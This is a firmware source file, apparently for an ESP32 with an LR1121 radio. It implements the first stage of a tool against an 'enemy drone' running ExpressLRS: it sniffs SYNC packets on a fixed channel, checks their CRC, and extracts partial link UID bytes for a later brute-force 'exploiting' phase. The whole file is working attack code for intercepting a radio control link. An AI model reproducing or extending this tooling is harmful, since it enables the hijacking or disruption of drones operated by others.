/**
 * firmware/src/phase1_net.cpp
 * ────────────────────────────
 * Phase 1: The Net
 *
 * LR1121 init → continuous RX on static channel → DIO1 ISR →
 * CRC validate → OTA version detect → SYNC packet hunt → UID extract
 *
 * The radio sits still on 915.0 MHz. Because the enemy drone uses FHSS,
 * its hopping sequence will eventually land on this channel. When it does,
 * the LR1121 hardware preamble detector fires DIO1 the instant it matches
 * the sync word (0x12). The ISR wakes this task in < 10 µs.
 */

#include "phase1_net.h"
#include "elrs_common.h"

#include <RadioLib.h>
#include <esp_log.h>
#include <driver/gpio.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>

static const char *TAG = "PHASE1";

// ── RadioLib instance ─────────────────────────────────────────────────────────
// Using SX1262 driver (compatible with LR1121 in SX126x emulation mode).
// Replace with LR1121 driver when RadioLib >= 6.5 ships full LR1121 support.
static SX1262 radio = new Module(PIN_NSS, PIN_DIO1, PIN_NRESET, RADIOLIB_NC);

// FreeRTOS task handle — ISR uses this to notify the Phase1 task
static TaskHandle_t s_phase1_task_handle = NULL;

// Shared output — written by phase1_task, read by phase2_task
volatile elrs_uid_t g_captured_uid = { .bytes = {0,0,0,0}, .complete = false };


// ── ISR ───────────────────────────────────────────────────────────────────────

static void IRAM_ATTR dio1_isr_handler(void *arg) {
    // Fires the exact microsecond the LR1121 matches preamble + sync word.
    // Do NOT read SPI here — just wake the task.
    BaseType_t higher_prio_woken = pdFALSE;
    vTaskNotifyGiveFromISR(s_phase1_task_handle, &higher_prio_woken);
    portYIELD_FROM_ISR(higher_prio_woken);
}


// ── Radio Init ────────────────────────────────────────────────────────────────

bool phase1_radio_init(void) {
    SPI.begin(PIN_SCK, PIN_MISO, PIN_MOSI, PIN_NSS);
    SPI.setFrequency(SPI_FREQ_HZ);   // 16 MHz — drain payload buffer fast

    int state = radio.begin(
        915.0,                      // frequency MHz — static hunting channel
        (float)ELRS_BW_KHZ,         // bandwidth kHz
        ELRS_SF,                     // spreading factor (set from Phase 0)
        ELRS_CODING_RATE,            // coding rate (5 = 4/5)
        ELRS_SYNC_WORD,              // 0x12 — ELRS private network
        10,                          // output power dBm (irrelevant — RX only)
        8                            // preamble length symbols
    );

    if (state != RADIOLIB_ERR_NONE) {
        ESP_LOGE(TAG, "Radio init failed: %d", state);
        return false;
    }

    // Set radio to RX-only mode — we never transmit
    radio.setDio1Action(NULL);   // handled via GPIO ISR below
    ESP_LOGI(TAG, "Radio init OK. SF=%d BW=%dkHz SyncWord=0x%02X",
             ELRS_SF, ELRS_BW_KHZ, ELRS_SYNC_WORD);
    return true;
}


void phase1_attach_interrupt(void) {
    gpio_config_t cfg = {
        .pin_bit_mask = (1ULL << PIN_DIO1),
        .mode         = GPIO_MODE_INPUT,
        .pull_up_en   = GPIO_PULLDOWN_ONLY,
        .intr_type    = GPIO_INTR_POSEDGE,
    };
    gpio_config(&cfg);
    gpio_install_isr_service(ESP_INTR_FLAG_IRAM);
    gpio_isr_handler_add((gpio_num_t)PIN_DIO1, dio1_isr_handler, NULL);
    ESP_LOGI(TAG, "DIO1 ISR attached on GPIO %d", PIN_DIO1);
}


// ── CRC ───────────────────────────────────────────────────────────────────────

uint8_t crc8_ccitt(const uint8_t *data, uint8_t len) {
    uint8_t crc = CRC8_INIT;
    for (uint8_t i = 0; i < len; i++) {
        crc ^= data[i];
        for (uint8_t b = 0; b < 8; b++) {
            crc = (crc & 0x80) ? (crc << 1) ^ CRC8_POLY : (crc << 1);
        }
    }
    return crc;
}

bool phase1_validate_crc(const uint8_t *buf, uint8_t total_len) {
    if (total_len < 2) return false;
    uint8_t computed = crc8_ccitt(buf, total_len - 1);
    return (computed == buf[total_len - 1]);
}


// ── OTA Version Detection ─────────────────────────────────────────────────────

uint8_t phase1_detect_ota_version(const uint8_t *buf) {
    // OTA version encoded in top 2 bits of header byte
    uint8_t ver = (buf[0] >> 6) & 0x03;
    if (ver == OTA_VERSION_1 || ver == OTA_VERSION_2) return ver;
    return 0;   // unknown — discard
}

uint8_t phase1_get_packet_type(const uint8_t *buf) {
    // Packet type in bits [5:4] of header byte
    return (buf[0] >> 4) & 0x03;
}


// ── UID Extraction ────────────────────────────────────────────────────────────

bool phase1_extract_uid(const uint8_t *buf, elrs_uid_t *uid) {
    uint8_t ota_ver = phase1_detect_ota_version(buf);
    uint8_t offset;

    switch (ota_ver) {
        case OTA_VERSION_1: offset = OTA_V1_UID_OFFSET; break;
        case OTA_VERSION_2: offset = OTA_V2_UID_OFFSET; break;
        default:
            ESP_LOGW(TAG, "Unknown OTA version — discarding");
            return false;
    }

    uid->bytes[0] = buf[offset];
    uid->bytes[1] = buf[offset + 1];
    uid->bytes[2] = buf[offset + 2];
    uid->bytes[3] = 0x00;   // unknown — brute forced in Phase 2
    uid->complete = false;

    ESP_LOGI(TAG, "UID extracted (OTA v%d): 0x%02X 0x%02X 0x%02X [??]",
             ota_ver, uid->bytes[0], uid->bytes[1], uid->bytes[2]);
    return true;
}


// ── Phase 1 Task ──────────────────────────────────────────────────────────────

void phase1_task(void *pvParameters) {
    s_phase1_task_handle = xTaskGetCurrentTaskHandle();

    if (!phase1_radio_init()) {
        ESP_LOGE(TAG, "Aborting — radio init failed");
        vTaskDelete(NULL);
        return;
    }

    phase1_attach_interrupt();

    uint8_t buf[ELRS_PACKET_SIZE];
    int     rx_len;

    ESP_LOGI(TAG, "[PHASE1] Hunting SYNC on 915.000 MHz...");

    // Enter continuous RX — radio will fire DIO1 on every preamble match
    radio.startReceive();

    for (;;) {
        // Block until ISR notifies us (or 500ms timeout for watchdog)
        uint32_t notified = ulTaskNotifyTake(pdTRUE, pdMS_TO_TICKS(500));

        if (!notified) {
            // Timeout — no packet. Keep waiting.
            continue;
        }

        // Read packet payload over SPI (high-speed — 16 MHz clock)
        int state = radio.readData(buf, ELRS_PACKET_SIZE);
        if (state != RADIOLIB_ERR_NONE) {
            radio.startReceive();
            continue;
        }

        // CRC validation — discard noise
        if (!phase1_validate_crc(buf, ELRS_PACKET_SIZE)) {
            radio.startReceive();
            continue;
        }

        // Only care about SYNC packets in this phase
        uint8_t pkt_type = phase1_get_packet_type(buf);
        if (pkt_type != PKT_TYPE_SYNC) {
            radio.startReceive();
            continue;
        }

        // Extract 3 known UID bytes
        elrs_uid_t uid;
        if (!phase1_extract_uid(buf, &uid)) {
            radio.startReceive();
            continue;
        }

        // Pass UID to Phase 2 via global + direct task notification
        g_captured_uid = uid;

        // Notify main state machine to advance to EXPLOITING
        // (main.cpp handles state transitions via task notifications)
        extern TaskHandle_t g_main_task_handle;
        xTaskNotify(g_main_task_handle, (uint32_t)STATE_EXPLOITING, eSetValueWithOverwrite);

        // Phase 1 task suspends — resumes if Phase 3 falls back to HUNTING
        vTaskSuspend(NULL);

        // ── Resumed by main.cpp on fallback ──────────────────────────────────
        ESP_LOGI(TAG, "[PHASE1] Restarted — hunting again...");
        radio.startReceive();
    }
}
